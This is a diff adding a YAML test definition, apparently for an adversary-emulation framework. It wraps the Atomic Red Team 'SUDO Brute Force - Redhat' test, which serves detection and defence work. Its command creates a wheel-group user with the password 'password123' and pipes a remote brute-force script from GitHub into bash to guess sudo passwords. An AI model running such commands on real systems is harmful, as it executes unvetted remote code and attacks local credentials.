@@ -1,0 +1,43 @@
+- access: {}
+  repeatable: false
+  delete_payload: true
+  description: "An adversary may find themselves on a box (e.g. via ssh key auth,\
+    \ with no password) with a user that has sudo'ers privileges, but they do not\
+    \ know the users password. Normally, failed attempts to access root will not cause\
+    \ the root account to become locked, to prevent denial-of-service. This functionality\
+    \ enables an attacker to undertake a local brute force password guessing attack\
+    \ without locking out the root user. \n\nThis test creates the \"art\" user with\
+    \ a password of \"password123\", logs in, downloads and executes the sudo_bruteforce.sh\
+    \ which brute force guesses the password, then deletes the user\n"
+  name: SUDO Brute Force - Redhat
+  privilege: ''
+  buckets:
+  - credential-access
+  tactic: credential-access
+  additional_info: {}
+  technique_name: 'Brute Force: Password Guessing'
+  executors:
+  - build_target: null
+    parsers: []
+    name: sh
+    timeout: 60
+    cleanup:
+    - groupdel wheel; userdel -fr art
+    command: 'groupadd wheel && useradd -G wheel -s /bin/bash -p $(openssl passwd
+      -1 password123) art && su art -c ''cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh
+      | bash''
+
+
+      '
+    language: null
+    additional_info: {}
+    payloads: []
+    variations: []
+    platform: linux
+    uploads: []
+    code: null
+  technique_id: T1110.001
+  singleton: false
+  requirements: []
+  plugin: atomic
+  id: 3f4dd4cffe51d21011fbe98bd2c00c09
